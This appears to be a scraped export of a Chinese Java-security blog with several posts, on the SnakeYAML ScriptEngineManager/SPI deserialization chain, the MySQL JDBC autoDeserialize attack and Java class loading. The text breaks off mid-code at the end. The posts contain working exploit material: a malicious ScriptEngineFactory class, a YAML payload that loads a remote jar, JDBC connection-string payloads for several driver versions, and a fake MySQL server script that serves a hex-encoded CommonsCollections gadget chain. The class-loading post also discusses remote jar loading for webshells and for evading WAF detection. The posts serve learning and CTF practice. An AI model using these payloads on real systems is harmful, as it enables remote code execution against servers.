服务提供发现机制，可以用来启用框架扩展和替换组件，主要是被框架的开发人员使用，比如java.sql.Driver接口，其他不同厂商可以针对同一接口做出不同的实现，MySQL和PostgreSQL都有不同的实现提供给用户，而Java的SPI机制可以为某个接口寻找服务实现。Java中SPI机制主要思想是将装配的控制权移到程序之外，在模块化设计中这个机制尤其重要，其核心思想就是 **解耦**。<br />SPI整体机制图如下：<br /><img src=\"/img/1-22/12.png\"><br />当服务的提供者提供了一种接口的实现之后，需要在classpath下的META-INF/services/目录里创建一个以服务接口命名的文件，这个文件里的内容就是这个接口的具体的实现类。当其他的程序需要这个服务的时候，就可以通过查找这个jar包（一般都是以jar包做依赖）的META-INF/services/中的配置文件，配置文件中有接口的具体实现类名，可以根据这个类名进行加载实例化，就可以使用该服务了。JDK中查找服务的实现的工具类是：java.util.ServiceLoader\n\n**实现细节**：程序会java.util.ServiceLoder动态装载实现模块，在META-INF/services目录下的配置文件寻找实现类的类名，通过Class.forName加载进来,newInstance()反射创建对象,并存到缓存和列表里面。\n\n<a name=\"VqaSn\"></a>\n### 示例\n我们现在需要使用一个内容搜索接口，搜索的实现可能是基于文件系统的搜索，也可能是基于数据库的搜索。\n\n- 先定义好接口\n```java\npublic interface Search {\n    public List<String> searchDoc(String keyword);   \n}\n```\n\n- 文件搜索实现\n```java\npublic class FileSearch implements Search{\n    @Override\n    public List<String> searchDoc(String keyword) {\n        System.out.println(\"文件搜索 \"+keyword);\n        return null;\n    }\n}\n```\n\n- 数据库搜索实现\n```java\npublic class DatabaseSearch implements Search{\n    @Override\n    public List<String> searchDoc(String keyword) {\n        System.out.println(\"数据搜索 \"+keyword);\n        return null;\n    }\n}\n```\n\n- resources 接下来可以在resources下新建META-INF/services/目录，然后新建接口全限定名的文件：com.cainiao.ys.spi.learn.Search，里面加上我们需要用到的实现类\n```xml\ncom.cainiao.ys.spi.learn.FileSearch\n```\n\n- 测试方法\n```java\npublic class TestCase {\n    public static void main(String[] args) {\n        ServiceLoader<Search> s = ServiceLoader.load(Search.class);\n        Iterator<Search> iterator = s.iterator();\n        while (iterator.hasNext()) {\n           Search search =  iterator.next();\n           search.searchDoc(\"hello world\");\n        }\n    }\n}\n```\n可以看到输出结果：文件搜索 hello world<br />如果在com.cainiao.ys.spi.learn.Search文件里写上两个实现类，那最后的输出结果就是两行了。<br />这就是因为ServiceLoader.load(Search.class)在加载某接口时，会去META-INF/services下找接口的全限定名文件，再根据里面的内容加载相应的实现类。<br />这就是spi的思想，接口的实现由provider实现，provider只用在提交的jar包里的META-INF/services下根据平台定义的接口新建文件，并添加进相应的实现类内容就好。\n\n<a name=\"A1jUC\"></a>\n### **ScriptEngineManager类**\n这个类就是java调用其他编程语言的类，jdk6引入，默认自带javascript的引擎，使用SPI机制<br />**ScriptEngineManager** 类是 Java 中 javax.script 包中的一个类，它提供了一种标准的框架，用于在 Java 程序中执行脚本语言。这个框架的目标是让 Java 与其他脚本语言（如JavaScript、Python等）进行交互变得更加容易。\n\n<a name=\"Nlkbl\"></a>\n## **ScriptEngineManager攻击链**\n<a name=\"GUp03\"></a>\n### exp编写\n我们上面的payload只是进行了dnslog进行漏洞验证，现在来编写exp和继续调式分析\n\n思路：根据SPI机制，和ScriptEngineManger就是SPI机制的实现，那么exp就是SPI机制中的服务提供者，编写恶意类实现相关接口，并在META-INF目录下的services目录下创建相关接口名称的文件，写上我们的恶意类的全类名，最后开启一个http服务，放置我们恶意的jar包\n\n进入上面最后的init方法中的initEngines方法中，可以看到ServiceLoad<ScriptEngineFactory><br /><img src=\"/img/1-22/13.png\"><br />那么加载的就是那些实现了ScriptEngineFactory接口的服务，那恶意类实现ScriptEngineFactory接口<br />\n\n新建项目<br />编写恶意类：\n```java\npackage com.yyjccc;\n\nimport javax.script.ScriptEngine;\nimport javax.script.ScriptEngineFactory;\nimport java.io.IOException;\nimport java.util.List;\n\npublic class exp implements ScriptEngineFactory {\n\tstatic {\n\t\ttry {\n\t\t\tRuntime.getRuntime().exec(\"calc\");\n\t\t} catch (IOException e) {\n\t\t\tthrow new RuntimeException(e);\n\t\t}\n\t}\n\n\tpublic String getEngineName() {\n\t\treturn null;\n\t}\n\n\tpublic String getEngineVersion() {\n\t\treturn null;\n\t}\n\n\tpublic List<String> getExtensions() {\n\t\treturn null;\n\t}\n\n\tpublic List<String> getMimeTypes() {\n\t\treturn null;\n\t}\n\n\tpublic List<String> getNames() {\n\t\treturn null;\n\t}\n\n\tpublic String getLanguageName() {\n\t\treturn null;\n\t}\n\n\tpublic String getLanguageVersion() {\n\t\treturn null;\n\t}\n\n\tpublic Object getParameter(String key) {\n\t\treturn null;\n\t}\n\n\tpublic String getMethodCallSyntax(String obj, String m, String... args) {\n\t\treturn null;\n\t}\n\n\tpublic String getOutputStatement(String toDisplay) {\n\t\treturn null;\n\t}\n\n\tpublic String getProgram(String... statements) {\n\t\treturn null;\n\t}\n\n\tpublic ScriptEngine getScriptEngine() {\n\t\treturn null;\n\t}\n}\n\n```\n编写对应文件，并使用maven进行打包生成jar 包，<br /><img src=\"/img/1-22/14.png\">\n\n在生成的jar包目录下使用python开启一个http服务<br /><img src=\"/img/1-22/15.png\">\n<a name=\"EsfJx\"></a>\n## <br />\n将payload改为\n```java\n!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:7788/exp.jar\"]]]]\n\n```\n这里是利用URLClassLoader对jar包的远程加载功能，最后执行代码，成功弹出计算器<br /><img src=\"/img/1-22/16.png\">\n<a name=\"C3J1V\"></a>\n## <br />\n<a name=\"PiHkH\"></a>\n### 调试过程\nSPI的特点就是查找所有的服务后封装到ServiceLoad,并使用迭代器进行类加载\n\n省略前面查找服务的过程<br />在initEnages方法中，迭代器迭代所有查找到的服务<br /><img src=\"/img/1-22/17.png\"><br />进入next方法中<br /><img src=\"/img/1-22/18.png\"><br />继续进入next,再进入nextService中<br />这里就会根据类加载器，进行类加载，并实例化对象<br /><img src=\"/img/1-22/19.png\"><br />这就是这条链子的终点，恶意类加载，最终rce\n\n\n<a name=\"h1k2F\"></a>\n## 漏洞修复\n其实该漏洞涉及到了全版本，只要反序列化内容可控,那么就可以去进行反序列化攻击<br />修复方案：加入new SafeConstructor()类进行过滤\n```java\npublic class main {\n    public static void main(String[] args) {\n\n        String context = \"!!javax.script.ScriptEngineManager [\\n\" +\n                \"  !!java.net.URLClassLoader [[\\n\" +\n                \"    !!java.net.URL [\\\"http://127.0.0.1:8888/yaml-payload-master.jar\\\"]\\n\" +\n                \"  ]]\\n\" +\n                \"]\";\n        Yaml yaml = new Yaml(new SafeConstructor());\n        yaml.load(context);\n    }\n\n}\n\n```\n结果：<br />\n\n<img src=\"/img/1-22/20.png\">\n\n\n\n这只是SnakeYaml反序列化漏洞的一部分哦~\n\n\n\n\n\n## **复习总结**\n\n这里只是简单介绍了SnakeYaml反序列化漏洞，不同的数据类型稍有不同，当数据为键值对时，会调用构造方法和setter方法。当数据是数组时候会调用构造方法，其中一条攻击链就是利用SPI机制来加载恶意类\n\n续集：SnakeYaml反序列化漏洞攻击链，可暂时参考：[SnakeYAML反序列化及可利用Gadget](https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/)","tags":["java安全","反序列化漏洞","web","SnakeYaml"],"categories":["java安全"]},{"title":"JDBC反序列化攻击","url":"/2023/12/26/jdbc反序列化/","content":"\n\n\n\n\n# JDBC反序列化攻击\n\n## 介绍\n\nJDBC（Java DataBase Connectivity）是一种用于执行Sql语句的Java Api，即Java数据库连接，是Java语言中用来规范客户端程序如何来访问数据库的应用程序接口，可以为多种关系数据库提供统一访问，提供了诸如查询和更新数据库中数据的方法，是Java访问数据库的标准规范。简单理解为链接数据库、对数据库操作都需要通过jdbc来实现。\n\nMysql JDBC 中包含一个危险的扩展参数： \"autoDeserialize\"。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据，造成RCE漏洞。\n\n## 分析\n\n> JDBC定义了一个叫**java.sql.Driver**的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。**java.sql.DriverManager.getConnection(xxx)**其实就是间接的调用了**java.sql.Driver**类的**connect**方法实现数据库连接的。数据库连接成功后会返回一个叫做**java.sql.Connection**的数据库连接对象，一切对数据库的查询操作都将依赖于这个**Connection**对象。\n\n\n\n当连接数据库的时候会执行内置的sql语句来确保连接成功\n\n<img src=\"/img/12-26/5.png\">\n\n当我们伪造返回数据为序列化数据时，使服务器触发反序列化\n\n\n\n\n\n入口点是`com.mysql.cj.jdbc.result.ResultSetImpl.getObject()`\n\n很明显这里触发了反序列化\n\n<img src=\"/img/12-26/1.png\">\n\n找调用 `getObject`的地方。找到了`com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()`\n\n<img src=\"/img/12-26/2.png\">\n\n在断点的函数里面就调用了`getObject`\n\n`ServerStatusDiffInterceptor`是一个拦截器，在JDBC URL中设定属性queryInterceptors为`ServerStatusDiffInterceptor`时，执行查询语句会调用拦截器的preProcess和postProcess方法，而preProcess方法和postProcess方法都调用了`populateMapWithSessionStatusValues`，进而通过上述调用链最终调用`getObject()`方法\n\n<img src=\"/img/12-26/3.png\">\n\n在JDBC连接数据库的过程中,会使用内置的sql语句查询确保连接，会调用`SHOW SESSION STATUS`去查询，然后对结果进行处理的时候会调用`resultSetToMap`.跟进去，看看resultSetToMap，最终触发getObject\n\n## 不同版本的payload\n\n**8.x**\n\n```\n\"jdbc:mysql://127.0.0.1:3309/test?characterEncoding=UTF-8&serverTimezone=Asia/Shanghai\" +  \n        \"&autoDeserialize=true\" +  \n    \"&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\";\n```\n\n**6.x**\n\n属性名不同，queryInterceptors 换为 statementInterceptors\n\n```\n\"jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\"\n```\n\n\\>**=5.1.11**\n\n包名中没有cj\n\n```\n\"jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\"\n```\n\n**5.x <= 5.1.10**\n\n同上，但需要连接后执行查询。\n\n**5.1.29 - 5.1.40**\n\n```\n\"jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&autoDeserialize=true\"\n```\n\n**5.1.28 - 5.1.19**\n\n```\n\"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true\"\n```\n\n## 利用\n\n我们需要伪造mysql服务端，用来传递反序列化的攻击数据\n\nmysql服务端POC\n\n```python\nimport socket\nimport binascii\nimport os\n\ngreeting_data=\"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\"\nresponse_ok_data=\"0700000200000002000000\"\n\ndef receive_data(conn):\n    data = conn.recv(1024)\n    print(\"[*] Receiveing the package : {}\".format(data))\n    return str(data).lower()\n\ndef send_data(conn,data):\n    print(\"[*] Sending the package : {}\".format(data))\n    conn.send(binascii.a2b_hex(data))\n\ndef get_payload_content():\n    //file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  \"calc\" > a \n    file= r'a'\n    if os.path.isfile(file):\n        with open(file, 'rb') as f:\n            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')\n        print(\"open successs\")\n\n    else:\n        print(\"open false\")\n        #calc\n        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'\n    return payload_content\n\n# 主要逻辑\ndef run():\n\n    while 1:\n        conn, addr = sk.accept()\n        print(\"Connection come from {}:{}\".format(addr[0],addr[1]))\n\n        # 1.先发送第一个 问候报文\n        send_data(conn,greeting_data)\n\n        while True:\n            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok\n            receive_data(conn)\n            send_data(conn,response_ok_data)\n\n            #其他过程\n            data=receive_data(conn)\n            #查询一些配置信息,其中会发送自己的 版本号\n            if \"session.auto_increment_increment\" in data:\n                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'\n                send_data(conn,_payload)\n                data=receive_data(conn)\n            elif \"show warnings\" in data:\n                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'\n                send_data(conn, _payload)\n                data = receive_data(conn)\n            if \"set names\" in data:\n                send_data(conn, response_ok_data)\n                data = receive_data(conn)\n            if \"set character_set_results\" in data:\n                send_data(conn, response_ok_data)\n                data = receive_data(conn)\n            if \"show session status\" in data:\n                mysql_data = '0100000102'\n                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'\n                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'\n                # 为什么我加了EOF Packet 就无法正常运行呢？？\n                //获取payload\n                payload_content=get_payload_content()\n                //计算payload长度\n                payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)\n                payload_length_hex = payload_length[2:4] + payload_length[0:2]\n                //计算数据包长度\n                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)\n                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]\n                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex\n                mysql_data += str(payload_content)\n                mysql_data += '07000005fe000022000100'\n                send_data(conn, mysql_data)\n                data = receive_data(conn)\n            if \"show warnings\" in data:\n                payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'\n                send_data(conn, payload)\n            break\n\n\nif __name__ == '__main__':\n    HOST ='0.0.0.0'\n    PORT = 3309\n\n    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间\n    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sk.bind((HOST, PORT))\n    sk.listen(1)\n\n    print(\"start fake mysql server listening on {}:{}\".format(HOST,PORT))\n\n    run()\n```\n\n思路：在服务器上触发某个方法，引起我们可控的jdbc连接，使其连上我们py脚本开启的fake_mysql_server,在这个服务端准备反序列化的数据\n\n然后再反弹shell\n\n\n\n**JDBC反序列化攻击流程**\n\n<img src=\"/img/12-26/4.png\">\n\n## 题目\n\n题目：[羊城杯 2020]a_piece_of_java \n\n链接：https://www.nssctf.cn/problem/1418\n\n题解：[Java部分题解 学习篇 – Crispr –热爱技术和生活](https://www.crisprx.top/archives/386#2020_a_piece_of_java)","tags":["web安全","java安全","反序列化漏洞"],"categories":["java安全"]},{"title":"java类加载机制与应用","url":"/2023/12/10/java类加载机制与应用/","content":"\n\n\n\n\n# java类加载机制与应用\n\n\n\n*学习类加载，有助于更好的进行攻击。如：*\n\n*使用冰蝎和哥斯拉的webshell，利用字节码加载的方式绕过**waf**检测*\n\n*在其他反**序列化**漏洞（比如fastjson反序列化漏洞）中的利用链中使用*\n\n\n\n我的感受：\n\n   开始学java时候学这些东西的时候，我确实搞得一脸懵。当学过一些java反序列化后。学到fastjson反序列化的时候，就是这里没搞好，也搞搞得懵逼了。但又回来学习这个类加载的时候，就感觉刚刚好\n\n\n\n\n\n\n\nJava是一个依赖于`JVM`（Java虚拟机）实现的跨平台的开发语言。Java程序在运行前需要先编译成`class文件`，Java类初始化的时候会调用`java.lang.ClassLoader`加载类字节码，`ClassLoader`会调用JVM的native方法（`defineClass0/1/2`）来定义一个`java.lang.Class`实例。\n\n## **ClassLoader**\n\n一切的Java类都必须经过JVM加载后才能运行，而`ClassLoader`的主要作用就是Java类文件的加载。在JVM类加载器中最顶层的是`Bootstrap ClassLoader（引导类加载器）`、`Extension ClassLoader（扩展类加载器）`、`App ClassLoader（系统类加载器）`，`AppClassLoader`是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用`AppClassLoader`加载类，`ClassLoader.getSystemClassLoader()`返回的系统类加载器也是`AppClassLoader`。\n\n值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个`null`值，如:`java.io.File.class.getClassLoader()`将返回一个`null`对象，因为`java.io.File`类在JVM初始化的时候会被`Bootstrap ClassLoader（引导类加载器）`加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被`Bootstrap ClassLoader`类加载器所加载的类的`ClassLoader`时候都会返回`null`。\n\n`ClassLoader`类有如下核心方法：\n\n1. `loadClass`（加载指定的Java类）\n2. `findClass`（查找指定的Java类）\n3. `findLoadedClass`（查找JVM已经加载过的类）\n4. `defineClass`（定义一个Java类）\n5. `resolveClass`（链接指定的Java类）\n\n其他加载类的方法：\n\n反射加载forName(clazzName,init,classload)\n\n后面两个是可选参数，分别表示是否进行类初始化，指定类加载器\n\n## **Java类动态加载方式**\n\nJava类加载方式分为`显式`和`隐式`,`显式`即我们通常使用`Java反射`或者`ClassLoader`来动态加载一个类对象，而`隐式`指的是`类名.方法名()`或`new`类实例。`显式`类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。\n\n**常用的类动态加载方式：**\n\n```java\n// 反射加载TestHelloWorld示例\nClass.forName(\"com.anbai.sec.classloader.TestHelloWorld\");\n\n// ClassLoader加载TestHelloWorld示例this.getClass().getClassLoader().loadClass(\"com.anbai.sec.classloader.TestHelloWorld\");\n```\n\n不同：\n\n- 反射加载类forName。是调用了defineClass。会触发静态代码块\n- 使用类加载器加载用loadClass只是将类load进来，不会触发静态代码块\n\n## **ClassLoader类加载流程**\n\n理解Java类加载机制并非易事，这里我们以一个Java的HelloWorld来学习`ClassLoader`。\n\n`ClassLoader`加载`com.anbai.sec.classloader.TestHelloWorld`类`loadClass`重要流程如下：\n\n1. `ClassLoader`会调用`public Class<?> loadClass(String name)`方法加载`com.anbai.sec.classloader.TestHelloWorld`类。\n2. 调用`findLoadedClass`方法检查`TestHelloWorld`类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。\n3. 如果创建当前`ClassLoader`时传入了父类加载器（`new ClassLoader(父类加载器)`）就使用父类加载器加载`TestHelloWorld`类，否则使用JVM的`Bootstrap ClassLoader`加载。\n4. 如果上一步无法加载`TestHelloWorld`类，那么调用自身的`findClass`方法尝试加载`TestHelloWorld`类。\n5. 如果当前的`ClassLoader`没有重写了`findClass`方法，那么直接返回类加载失败异常。如果当前类重写了`findClass`方法并通过传入的`com.anbai.sec.classloader.TestHelloWorld`类名找到了对应的类字节码，那么应该调用`defineClass`方法去JVM中注册该类。\n6. 如果调用loadClass的时候传入的`resolve`参数为true，那么还需要调用`resolveClass`方法链接类，默认为false。\n7. 返回一个被JVM加载后的`java.lang.Class`类对象。\n\n## **自定义ClassLoader**\n\n`java.lang.ClassLoader`是所有的类加载器的父类，`java.lang.ClassLoader`有非常多的子类加载器，比如我们用于加载jar包的`java.net``.URLClassLoader`其本身通过继承`java.lang.ClassLoader`类，重写了`findClass`方法从而实现了加载目录class文件甚至是远程资源文件。\n\n如果`com.anbai.sec.classloader.TestHelloWorld`类存在的情况下，我们可以使用如下代码即可实现调用`hello`方法并输出：\n\n```java\nTestHelloWorld t = new TestHelloWorld();\n        String str = t.hello();\n        System.out.println(str);\n```\n\n但是如果`com.anbai.sec.classloader.TestHelloWorld`根本就不存在于我们的`classpath`，那么我们可以使用自定义类加载器重写`findClass`方法，然后在调用`defineClass`方法的时候传入`TestHelloWorld`类的字节码的方式来向JVM中定义一个`TestHelloWorld`类，最后通过反射机制就可以调用`TestHelloWorld`类的`hello`方法了。\n\n```java\npackage com.anbai.sec.classloader;\nimport java.lang.reflect.Method;\npublic class TestClassLoader extends ClassLoader {\n    // TestHelloWorld类名\n    private static String testClassName = \"com.anbai.sec.classloader.TestHelloWorld\";\n   // TestHelloWorld类字节码\n    private static byte[] testClassBytes = new byte[]{\n            -54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,\n            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,\n            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,\n            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,\n            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,\n            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,\n            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,\n            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,\n            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,\n            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,\n            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,\n            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,\n            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,\n            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,\n            0, 0, 0, 2, 0, 12\n    };\n    @Overridepublic Class<?> findClass(String name) throws ClassNotFoundException {\n        // 只处理TestHelloWorld类\n        if (name.equals(testClassName)) {\n            // 调用JVM的native方法定义TestHelloWorld类\n            return defineClass(testClassName, testClassBytes, 0, testClassBytes.length);\n        }\n\n        return super.findClass(name);\n    }\n\n    public static void main(String[] args) {\n        // 创建自定义的类加载器\n        TestClassLoader loader = new TestClassLoader();\n\n        try {\n            // 使用自定义的类加载器加载TestHelloWorld类\n            Class testClass = loader.loadClass(testClassName);\n\n            // 反射创建TestHelloWorld类，等价于 TestHelloWorld t = new TestHelloWorld();\n            Object testInstance = testClass.newInstance();\n\n            // 反射获取hello方法\n            Method method = testInstance.getClass().getMethod(\"hello\");\n\n            // 反射调用hello方法,等价于 String str = t.hello();\n            String str = (String) method.invoke(testInstance);\n\n            System.out.println(str);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n}\n```\n\n利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码\n\n##  **URLClassLoader**\n\n`URLClassLoader`继承了`ClassLoader`，`URLClassLoader`提供了加载远程资源的能力，在写漏洞利用的`payload`或者`webshell`的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。\n\n一般用来加载jar文件，加载本地的使用file协议，远程的http\n\n```java\npackage com.anbai.sec.classloader;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\n public class TestURLClassLoader {\n\n    public static void main(String[] args) {\n        try {\n            // 定义远程加载的jar路径\n            URL url = new URL(\"https://anbai.io/tools/cmd.jar\");\n\n            // 创建URLClassLoader对象，并加载远程jar包\n            URLClassLoader ucl = new URLClassLoader(new URL[]{url});\n\n            // 定义需要执行的系统命令\n            String cmd = \"ls\";\n\n            // 通过URLClassLoader加载远程jar包中的CMD类\n            Class cmdClass = ucl.loadClass(\"CMD\");\n\n            // 调用CMD类中的exec方法，等价于: Process process = CMD.exec(\"whoami\");\n            Process process = (Process) cmdClass.getMethod(\"exec\", String.class).invoke(null, cmd);\n\n            // 获取命令执行结果的输入流\n            InputStream           in   = process.getInputStream();\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            byte[]                b    = new byte[1024];\n            int                   a    = -1;\n\n            // 读取命令执行结果\n            while ((a = in.read(b)) != -1) {\n                baos.write(b, 0, a);\n            }\n\n            // 输出命令执行结果\n            System.out.println(baos.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n}\n```\n\n远程的`cmd.jar`中就一个`CMD.class`文件，对应的编译之前的代码片段如下：\n\n```java\nimport 